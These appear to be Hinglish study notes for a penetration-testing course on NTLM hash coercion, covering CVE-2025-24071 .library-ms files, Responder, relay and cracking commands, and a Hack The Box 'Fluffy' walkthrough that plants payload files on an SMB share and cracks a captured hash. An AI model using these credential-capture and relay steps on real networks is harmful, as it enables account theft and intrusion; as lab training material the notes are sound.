# NTLM Hash Leak / Coercion Techniques (Hinglish Notes)

**Category:** Credential Capture
**CPTS Module:** Attacking Active Directory

## Concept samjho

Bhai ye ek pura family of attacks hai jo ek hi logic pe chalti hai: **kisi ko trick karo ya force karo ki wo tumhare paas authenticate kare**, phir uska NTLM hash capture karo listener se, aur fir usko crack ya relay karo. Trigger alag ho sakta hai (malicious file, forced RPC call, poisoned broadcast) lekin capture+crack ka core wahi rehta hai.

### CVE-2025-24071 (`.library-ms` wala jugaad)

Ye ek `.library-ms` file hoti hai jo ek remote path point karti hai. Jaise hi koi Windows user us folder ko **sirf browse/preview** karta hai (jo zip se extract hua hota hai), Explorer automatically us remote path pe authenticate karne ki koshish karta hai — bina kisi double-click ke, bina execution ke! Bas dekhna hi kaafi hai. Isse victim ka NetNTLMv2 hash chup-chaap leak ho jata hai tumhare listener pe.

## Tools ka roster

| Tool | Kaam | Type |
|---|---|---|
| CVE-2025-24071 PoC generator | Malicious `.library-ms` + `.zip` banata hai | Exploit/Payload |
| `Responder` | NTLM auth attempts capture karta hai (LLMNR/NBT-NS poisoning bhi karta hai) | Capture |
| `Inveigh` | Windows wala Responder jaisa tool | Capture |
| `john` | Offline hash cracking | Cracking |
| `hashcat` | GPU se fast cracking | Cracking |
| `ntlmrelayx` | Hash crack karne ki jagah relay kar do (agar signing off hai) | Relay |

## Commands — cheat sheet

```bash
# Apni machine pe listener chalu karo
responder -I <interface> -wvF
# -w = WPAD rogue proxy, -v = verbose, -F = OS fingerprint

# Captured hash crack karo
john --format=netntlmv2 --wordlist=rockyou.txt hash.txt
hashcat -m 5600 hash.txt rockyou.txt

# Ya crack karne ki jagah relay maar do
ntlmrelayx.py -tf targets.txt -smb2support
```

## Practical Example — Fluffy (HTB) se seedha

**Setup:** Writable `IT` share mil chuka tha (dekho `SMB-Enumeration.md`). Us share mein ek PDF thi `Upgrade_Notice.pdf` naam ki, jisse CVE-2025-24071 ka clue mila.

**1. Payload banaya aur deliver kiya:**

```bash
smbclient //10.10.11.69/IT -U j.fleischman
smb: \> put docs.library-ms
smb: \> put exploit.zip
```
*Screenshot reference: `htb_fluffy_smb_expoit_c_and_u.png` — dono files successfully upload ho gayi.*

**2. Apni machine pe listener chalu kiya:**

```bash
responder -I tun0 -wvF
```

**3. Bas wait kiya.** Thodi der mein ek user (`p.agila`) us share ko browse kiya, aur trap trigger ho gaya. Responder ne uska NetNTLMv2 hash pakad liya.

**4. Offline crack kiya:**

```bash
john --wordlist=rockyou.txt captured_hash.txt
```
Result: password mil gaya `promXXXXXXXXXXX` — `p.agila` ka. Ye password pura aage ka chain unlock karta hai.

**Yaad rakhna:** Ye attack sirf isliye chala kyunki humein pehle ek **writable, browsable location** mil chuka tha. Bina us entry point ke ye trick kaam hi nahi karti.
